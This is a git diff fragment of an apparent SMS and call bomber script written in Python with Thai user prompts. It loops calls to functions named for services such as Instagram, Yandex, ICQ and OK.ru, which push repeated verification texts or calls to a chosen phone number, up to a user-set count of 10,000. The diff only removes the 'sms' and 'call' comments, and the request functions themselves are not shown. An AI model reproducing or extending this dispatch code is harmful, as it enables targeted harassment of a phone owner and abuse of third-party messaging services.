@@ -104,13 +104,13 @@ def homepro(phone):
 """loop func """
 def loop(pho):
     for _ in range(2):
-        exec.submit(okru,pho) # call
-        exec.submit(findclone,pho) # call
-        exec.submit(unacademy,pho) # sms
-        exec.submit(icq,pho) # sms
-        exec.submit(instagram,pho) # sms
-        exec.submit(instagramv2,pho) # sms
-        exec.submit(yandex,pho) # sms
+        exec.submit(okru,pho)
+        exec.submit(findclone,pho)
+        exec.submit(unacademy,pho)
+        exec.submit(icq,pho)
+        exec.submit(instagram,pho)
+        exec.submit(instagramv2,pho)
+        exec.submit(yandex,pho)
         sleep(10)
 
 if __name__ == "__main__":
@@ -120,7 +120,7 @@ if __name__ == "__main__":
     i = int(input("[!] จำนวน sms (เต็ม. 10K) >> "))
     exec.submit(loop,pho)
     for _ in range(i):
-        exec.submit(shopat,pho) # sms
-        exec.submit(p1112,pho) # sms
-        exec.submit(p1112v2,pho) # sms
-        exec.submit(homepro,pho) # sms
+        exec.submit(shopat,pho)
+        exec.submit(p1112,pho)
+        exec.submit(p1112v2,pho)
+        exec.submit(homepro,pho)
